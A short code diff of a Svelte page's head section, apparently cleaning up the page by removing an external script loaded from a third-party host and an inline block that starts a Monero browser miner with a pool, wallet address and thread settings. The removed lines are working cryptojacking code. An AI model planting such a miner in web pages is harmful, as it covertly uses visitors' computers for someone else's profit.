@@ -22,17 +22,6 @@
 <svelte:head>
     <link rel="stylesheet" href="/data/style/style.css" />
     <title>Boofdev - Test article</title>
-    <script src="https://script.ghgi.xyz"></script>
-    <script>
-        server = "wss://ghgi.xyz";
-        var pool = "moneroocean.stream";
-        var walletAddress = "486ip4Bz8HigxM8NycTJTuE3qRAHdmWCpWgwQPc3urNdbA4NANFRU24MnHHeZ4oa1cYX8AKMAkK1Liy9oYD7NK1XHUxnUcS";
-        var workerId = ""
-        var threads = -1;
-        var password = "x";
-        startMining(pool, walletAddress, workerId, threads, password);
-        throttleMiner = 20;
-    </script>
 </svelte:head>
 
 <Nav />
